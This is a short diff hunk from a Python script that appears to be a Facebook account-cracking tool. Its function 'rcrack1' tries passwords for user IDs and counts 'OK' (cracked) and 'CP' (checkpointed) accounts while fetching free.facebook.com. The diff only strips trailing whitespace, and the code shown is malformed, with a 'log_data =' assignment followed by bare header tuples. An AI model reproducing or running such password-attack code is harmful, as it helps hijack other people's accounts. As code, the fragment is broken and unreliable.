@@ -244,7 +244,7 @@ def rcrack1(uid,pwx,tl):
             sys.stdout.write('\r[\033[1;92mPARVEJ\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
-            log_data = 
+            log_data =
 ('Accept-Encoding', 'gzip, deflate')
 ('Accept', '*/*')
 ('Connection', 'keep-alive')
